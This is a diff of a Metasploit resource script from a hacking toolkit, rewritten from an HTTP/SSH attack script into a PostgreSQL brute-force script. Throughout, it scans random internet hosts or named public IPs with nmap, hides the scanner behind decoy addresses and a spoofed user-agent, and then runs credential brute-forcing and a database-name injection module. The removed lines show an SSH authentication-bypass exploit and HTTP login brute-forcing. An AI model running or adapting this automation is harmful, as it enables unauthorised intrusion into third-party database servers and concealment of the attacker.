@@ -1,18 +1,17 @@
 ##
-# Script: http_CVE.rc
+# Script: postgres_brute.rc
 # Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
 # GitHub: https://github.com/r00t-3xp10it/resource_files
 # -
 # [OPTIONS]
 # setg SAVE_DB true - Save workspace mosquito to database.xml
-# setg LIMMIT 1000 - Limit the number of random rhosts to search
-# setg NSE_PATH /usr/share/nmap/scripts - The absoluct path of nmap nse scripts local folder.
-# setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with ports 21:22:80:445 open
-# setg RHOSTS 154.194.198.245 66.199.38.187 - To instruct db_nmap to check targets for ports 21:22:80 open
+# setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
+# setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
+# setg RHOSTS 205.88.183.168 216.15.177.33 162.246.22.133 - To instruct db_nmap to scan hosts for ports open.
 # -
 # [SYNTAX EXAMPLES]
-# msf5 > setg RANDOM_HOSTS true;resource /root/http_CVE.rc'
-# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/http_CVE.rc'
+# msf5 > setg RANDOM_HOSTS true;resource /root/postgres_brute.rc'
+# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/postgres_brute.rc'
 ##
   <ruby>
       run_single("workspace -a mosquito")
@@ -24,25 +23,25 @@
            /_/ /_/ /_/\\____//____/ \\__, / \\__,_/ /_/  \\__/ \\____/
                                   🦟 /_/                       🦟
 
-    Script: http_CVE.rc
+    Script: postgres_brute.rc
     Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
     GitHub: https://github.com/r00t-3xp10it/resource_files
 
       |
       print_line(help)
-      Rex::sleep(2.0)
+      Rex::sleep(1.5)
 
 
       ## Make sure we are connected to db
       unless framework.db.active
-        print_error("Database not connected to postgresql.")
+        print_error("[ERROR] Database not connected to postgresql.")
         print_warning("[execute] service postgresql start")
         run_single("exit")
         return nil
       else
-        local = Dir.pwd
         print_good("Database connected to postgresql.")
         Rex::sleep(0.5)
+        local = Dir.pwd
         work_name = framework.db.workspace.name
         print_status("Working in workspace: *#{work_name}")
         Rex::sleep(1.0)
@@ -64,56 +63,49 @@
          print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
       end
 
-      ## Nmap freevulnsearch.nse absoluct path
-      if (framework.datastore['NSE_PATH'] == nil or framework.datastore['NSE_PATH'] == '')
-         nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
-         print_line("NSE_PATH => #{nse}")
-      else
-         nse = "#{framework.datastore['NSE_PATH']}/freevulnsearch.nse"
-         print_line("NSE_PATH => #{nse}")
-      end
-
-      ## db_nmap WAN or RHOSTS scan settings 21,22,80 http-enum.nse,banner.nse,http-slowloris-check.nse ssl-poodle.nse ftp-anon.nse
+      ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
+      # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
       if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
-         run_single("db_nmap -sS -v -Pn -T4 -O -p 21,22,80 --open --script=banner.nse,http-headers.nse,http-slowloris-check.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 5432 --open --script=banner.nse,http-headers.nse,pgsql-brute.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
       elsif (framework.datastore['RANDOM_HOSTS'] == "true")
-         print_status("Nmap: search for random remote hosts with ports 21:22:80 open")
-         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 21,22,80 --open --script=banner.nse,http-headers.nse,http-slowloris-check.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
+         print_status("Nmap: search for random remote hosts with ports 5432 open")
+         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 5432 --open --script=banner.nse,http-headers.nse,pgsql-brute.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
       else
-         run_single("db_nmap -sS -v -Pn -T4 -O -p 21,22,80 --open --script=banner.nse,http-headers.nse,http-slowloris-check.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 5432 --open --script=banner.nse,http-headers.nse,pgsql-brute.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
       end
 
-      ## Read the database.
+      ## Read the database
       if File.directory?("#{local}/logs")
-         run_single("spool #{local}/logs/http_CVE.log")
+         run_single("spool #{local}/logs/postgres_brute.log")
       end
       print_line("")
       run_single("services")
-      print_good("Reading msfdb database for info.")
+      print_good("Sellecting target hosts from msf database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:proto).join(' ')
       xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
+      run_single("setg RHOSTS #{xhost}")
+      Rex::sleep(2.0)
 
-      ## Make sure that exists hosts/ports (open) in database
-      if xhost.nil? or xhost == '' or xhost == ' '
-           print_error("db_nmap scan did not find any alive connections.")
-           print_error("Please wait, cleaning recent configurations.")
-           Rex::sleep(1.0)
-           run_single("unsetg all")
-           run_single("workspace -d mosquito")
-           return nil
-      elsif xport.nil? or xport == '' or xport == ' '
-           print_error("db_nmap did not find any 21,22,80,445 open ports.")
-           print_error("Please wait, cleaning recent configurations.")
-           Rex::sleep(1.0)
-           run_single("unsetg all")
-           run_single("workspace -d mosquito")
-           return nil
-      end
+         ## Make sure that exists hosts/ports (open) in database
+         if xhost.nil? or xhost == '' or xhost == ' '
+              print_error("[ERROR] db_nmap scan did not find any alive connections.")
+              print_error("please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unsetg all")
+              run_single("workspace -d mosquito")
+              return nil
+         elsif xport.nil? or xport == '' or xport == ' '
+              print_error("[ERROR] db_nmap did not find any 5432 open ports.")
+              print_error("please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unsetg all")
+              run_single("workspace -d mosquito")
+              return nil
+         end
 
       ## Make sure that freevulnseach.nse exists
-      run_single("setg RHOSTS #{xhost}")
       Rex::sleep(2.0)
       unless (File.exist?(nse))
            print_error("[ERROR] freevulnsearch.nse/vulners.nse script(s) not found in nmap db.")
@@ -145,39 +137,25 @@
            print_good("freevulnsearch.nse/vulners.nse script(s) found.")
       end
 
-         if xport =~ /22/ or proto =~ /ssh/i
-              print_warning("Remote Target port: 22 ssh found")
-              Rex::sleep(1.0)
-              run_single("use auxiliary/scanner/ssh/libssh_auth_bypass")
-              run_single("set SPAWN_PTY true")
-              print_line("")
-              run_single("services -c name -S ssh -R")
-              run_single("exploit")
-         end
 
-         if xport =~ /80/i or proto =~ /http/i
-              print_warning("Remote Target port: 80 http found")
+         ## Run gather/brute-force modules
+         if xport =~ /5432/ or proto =~ /postgres/i
+              print_warning("Remote Target port: 5432 postgres found")
               Rex::sleep(1.0)
-              run_single("use auxiliary/scanner/http/options")
-              run_single("set THREADS 25")
+              run_single("use auxiliary/scanner/postgres/postgres_version")
               print_line("")
-              run_single("services -c name -S http -R")
+              run_single("services -c name -S postgres -R")
               run_single("exploit")
-              run_single("use auxiliary/scanner/http/dir_listing")
-              run_single("set THREADS 55")
+              run_single("use auxiliary/scanner/postgres/postgres_dbname_flag_injection")
               print_line("")
-              run_single("services -c name -S http -R")
+              run_single("services -c name -S postgres -R")
+              run_single("set THREADS 35")
               run_single("exploit")
-              run_single("use auxiliary/scanner/http/dir_scanner")
-              run_single("set THREADS 16")
-              print_line("")
-              run_single("services -c name -S http -R")
-              run_single("exploit")
-              run_single("use auxiliary/scanner/http/http_login")
+              run_single("use auxiliary/scanner/postgres/postgres_login")
               run_single("set STOP_ON_SUCCESS true")
-              run_single("set THREADS 16")
+              run_single("set BRUTEFORCE_SPEED 4")
               print_line("")
-              run_single("services -c name -S http -R")
+              run_single("services -c name -S postgres -R")
               run_single("exploit")
          end
 
@@ -221,10 +199,10 @@
       dtr = `date`
       ## Writting ['xhost(s)'] to mosquito logfile
       if File.directory?("#{local}/logs")
-         print_warning("Logfile stored under: #{local}/logs/http_CVE.log")
-         run_single("echo \"[#{dtr}] http_cve: #{xhost}\" >> logs/mosquito.log")
+         print_warning("Logfile stored under: #{local}/logs/postgres_brute.log")
+         run_single("echo \"[#{dtr}] postgres_brute: #{xhost}\" >> logs/mosquito.log")
       end
       File.delete("ip_range.txt") if File.exist?("ip_range.txt")
-   run_single("back")
-</ruby>
+      run_single("back")
+   </ruby>
 
